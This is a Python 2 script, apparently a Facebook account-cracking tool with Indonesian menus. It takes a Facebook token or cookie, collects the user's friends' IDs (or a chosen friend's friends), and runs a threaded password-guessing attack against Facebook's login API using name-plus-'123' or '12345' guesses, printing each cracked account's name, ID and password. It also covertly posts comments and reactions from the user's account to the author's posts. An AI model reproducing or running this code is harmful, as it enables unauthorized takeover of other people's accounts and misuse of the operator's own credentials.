#!/usr/bin/python2
# coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')
	

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
		
logo = """  
\033[32m….._\____________________,,__
\033[32m…./ `–│││││││││  \033[0;1mMejuah-Juah -->
\033[32m…/_==o ______________\033[0;1mBinjai City -->
\033[32m…..),—.(_(__) /
\033[32m….// (\) ),——
\033[32m…//___//
\033[32m../`—-’ / …
\033[32m./____ / … 
\033[32m╔═════════════════=========
\033[33m{*}\033[0;1mAuthor kalak karo
\033[33m{*}\033[0;1mDecompile bye jepri barus
\033[33m{✓}\033[0;1mYoutube Bang Jep
\033[32m╚═════════════════========="""""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
id = []

##### MASUK #####
def masuk():
	os.system('clear')
	print logo
	print 52* ('\033[0;93m─');time.sleep(0.07)
	print ('\033[0;92m1.\033[0;97m Login Via Token Facebook');time.sleep(0.07)
	print ('\033[0;92m2.\033[0;97m Login Via Cookie Facebook');time.sleep(0.07)
	print ('\033[0;92m3.\033[0;97m Ambil Token Dari Link');time.sleep(0.07)
	print ('\033[0;91m0.\033[0;97m Keluar');time.sleep(0.07)
	print 52* ('\033[0;93m─');time.sleep(0.07)
	pilih_masuk()

#### PILIH MASUK ####
def pilih_masuk():
	msuk = raw_input('\033[0;92m>\033[0;97m ')
	if msuk =="":
		print '\033[0;91m! Isi Yg Benar'
		pilih_masuk()
	elif msuk =="1":
		login_token()
	elif msuk =="2":
		login_cookie()
	elif msuk =="3":
		ambil_link()
	elif msuk =="0":
		keluar()
	else:
		print"\033[0;91m! Isi Yg Benar"
		pilih_masuk()
			
#### LOGIN_TOKEN ####
def login_token():
	os.system('clear')
	print logo
	print 50* '\033[0;93m─'
	toket = raw_input("\033[0;95m•\033[0;97m Token \033[0;91m:\033[0;92m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[0;92m√ Login Berhasil'
		os.system('xdg-open https://m.facebook.com/Rizky.Rasata')
		bot_komen()
	except KeyError:
		print '\033[1;91m! Token salah '
		time.sleep(1.7)
		masuk()
	except requests.exceptions.SSLError:
		print '! Koneksi Bermasalah'
		exit()
		
#### LOGIN COOKIES ####
def login_cookie():
	os.system('clear')
	print logo
	print ("\033[0;93m──────────────────────────────────────────────────────");time.sleep(0.07)
	try:
		cookie = raw_input("\033[0;95m•\033[0;97m Cookie \033[0;91m:\033[0;92m ")
		data = {
		            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
			        'referer' : 'https://m.facebook.com/',
			        'host' : 'm.facebook.com',
			        'origin' : 'https://m.facebook.com',
			        'upgrade-insecure-requests' : '1',
			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			        'cache-control' : 'max-age=0',
			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			        'content-type' : 'text/html; charset=utf-8',
			         'cookie' : cookie }
		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
		cari = re.search('(EAAA\w+)', coki.text)
		hasil = cari.group(1)
		zedd = open("login.txt", 'w')
		zedd.write(hasil)
		zedd.close()
		print '\033[0;92m√ Login Berhasil'
		time.sleep(2)
		menu()
	except AttributeError:
		print '\033[0;91m! Cookie Salah'
		time.sleep(2)
		masuk()
	except UnboundLocalError:
		print '\033[0;91m! Cookie Salah'
		time.sleep(2)
		masuk()
	except requests.exceptions.SSLError:
		os.system('clear')
		print '\033[0;91m! Koneksi Bermasalah'
		exit()
		
#### BOT KOMEN ####
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	kom = ('Gw Pake Sc Lu Bang 😘')
	reac = ('ANGRY')
	post = ('937777953338365')
	post2 = ('938954086554085')
	kom2 = ('Mantap Bang 😁')
	reac2 = ('LOVE')
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print '\033[0;91m! Token Invalid '
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print '\033[0;91m ! Token invalid'
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print '\033[0;91m! Tidak ada koneksi'
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[33;1m Nama Anda \033[1;91m: \033[0;1m"+nama+"\033[0;1m                  "
	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[33;1m ID Anda   \033[1;91m: \033[0;1m"+id+"\x1b[0;1m              "
	print 42*"\033[1;96m="
	print "\x1b[32m1.\x1b[0;1m Hack facebook Sekarang"
	print "\n\x1b[32m0.\x1b[34;1m Keluar            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar bosku"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar bosku"
		pilih()
		
		
def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print "\x1b[32m1.\x1b[0;1m Hack Dari Daftar Teman"
	print "\x1b[32m2.\x1b[0;1m Hack Dari Daftar Teman Dari Teman \033[32m(✓)"
	print "\n\x1b[32m0.\x1b[34;1m Kembali"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[32m="
		jalan('\033[1;96m[#] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[32m="
		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[0;1m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama teman\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mTeman tidak ditemukan!"
			raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
			super()
		jalan('\033[1;96m[✓] \033[1;93mMengambil ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mIsi yang benar bosku"
		pilih_super()
	
	print "\033[1;96m[+] \033[33;1mTotal ID \033[1;93m: \033[0;1m"+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[33;1m✓\033[1;96m] \033[33;1mLagi Proses bosku, mohon sabar \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[32mProses sedikit lama tidak seperti biasanya ')
	print('\x1b[1;96m[!] \x1b[32msekarang saya pakai 12 tebakan password ')
	print 42*"\033[34;1m-"
	print('\x1b[1;96m[!] \x1b[0;1mjika hasil cp, Harap simpan selama 2 hari ')
	print('\x1b[1;96m[!] \x1b[0;1mdalam 2 hari hasil cp akan pulih sendiri ')
	print 42*"\033[33;1m-"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
				print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
				print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
					print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
					print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
						print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
						print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
							print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
							print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['last_name']+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
								print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
								print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
									print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
									print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['last_name']+'12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
										print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
										print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
											print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
											print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
											cek.close()
											cekpoint.append(user+pass4)
										else:
											birthday = 'Kontol'
											pass5 = birthday.replace('/', '')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[33;1m[cp] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
												print '\x1b[33;1m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
												print '\x1b[33;1m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[32m[OK] \x1b[0;1mNama \x1b[1;91m    : \x1b[0;1m' + b['name']
													print '\x1b[32m[➹] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
													print '\x1b[32m[➹] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
													cek.close()
													cekpoint.append(user+pass5)
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	super()
	
       
		
if __name__ == '__main__':
        masuk()
